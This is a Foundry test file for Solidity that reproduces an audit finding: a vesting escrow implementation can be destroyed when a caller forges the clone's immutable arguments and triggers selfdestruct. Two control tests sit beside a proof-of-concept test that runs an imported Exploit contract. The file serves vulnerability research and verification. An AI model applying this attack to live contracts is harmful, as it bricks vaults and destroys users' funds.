// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./29688-h-1-vaults-can-be-bricked-by-selfdestructing-implementations.sol";

/*//////////////////////////////////////////////////////////////
    Rio Vesting Escrow — H-1: Vaults can be bricked by
    selfdestruct()ing implementations, using forged immutable
    args. Finding #29688 (Sherlock, IllIllI) — HIGH.
//////////////////////////////////////////////////////////////*/
contract SelfdestructBrickTest is Test {
    /// @notice CONTROL: a legitimate escrow clone, using its OWN fixed
    ///         construction-time immutable args (not attacker-forged),
    ///         successfully routes a vote through the real proxy pattern to
    ///         a benign voting adaptor — no destruction, no bypass.
    function test_control_legitimateCloneVotesNormally() public {
        VestingEscrowVuln impl = new VestingEscrowVuln();
        NoOpVotingAdaptor noOpAdaptor = new NoOpVotingAdaptor();
        LegitFactory legitFactory = new LegitFactory(address(noOpAdaptor));
        VestingEscrowClone clone = new VestingEscrowClone(address(impl), address(legitFactory), address(this));

        // `this` test contract is the clone's configured recipient, so its
        // own call to clone.vote() satisfies onlyRecipient and resolves the
        // real, benign voting adaptor — no revert, no bypass, no destruction.
        clone.vote();

        assertGt(_codeSize(address(impl)), 0, "implementation should be untouched");
        assertGt(_codeSize(address(noOpAdaptor)), 0, "benign voting adaptor should be untouched");
    }

    /// @notice CONTROL: calling the implementation directly WITHOUT forged
    ///         recipient args reverts (onlyRecipient is a real, working guard
    ///         against a naive direct call with no calldata tail at all).
    function test_control_directCallWithoutForgedArgs_reverts() public {
        VestingEscrowVuln impl = new VestingEscrowVuln();
        (bool ok,) = address(impl).call(abi.encodeWithSignature("vote()"));
        assertFalse(ok, "a bare direct call (no forged immutable args) should revert");
    }

    /// @notice HARM: forging BOTH factory() and recipient() via a
    ///         hand-crafted calldata tail lets ANY caller destroy the shared
    ///         implementation that every escrow clone depends on. Proven via
    ///         the implementation's ETH balance being forced to zero by the
    ///         SELFDESTRUCT that runs with the implementation's own identity
    ///         (address(this) == impl throughout the delegatecall chain) —
    ///         the actual code/storage deletion is deferred to end-of-
    ///         transaction by the EVM and cannot be observed mid-call, the
    ///         same limitation the finding's own PoC ran into.
    function test_selfdestructBricksImplementation() public {
        Exploit exploit = new Exploit();
        vm.deal(address(this), 1 ether);
        exploit.run{value: 1 ether}();

        assertTrue(exploit.attackCallSucceeded(), "the forged direct call should have succeeded");
        assertEq(address(exploit.impl()).balance, 0, "implementation's ETH should be gone (selfdestruct fired against it)");
    }

    function _codeSize(address _addr) internal view returns (uint256 size) {
        assembly {
            size := extcodesize(_addr)
        }
    }
}
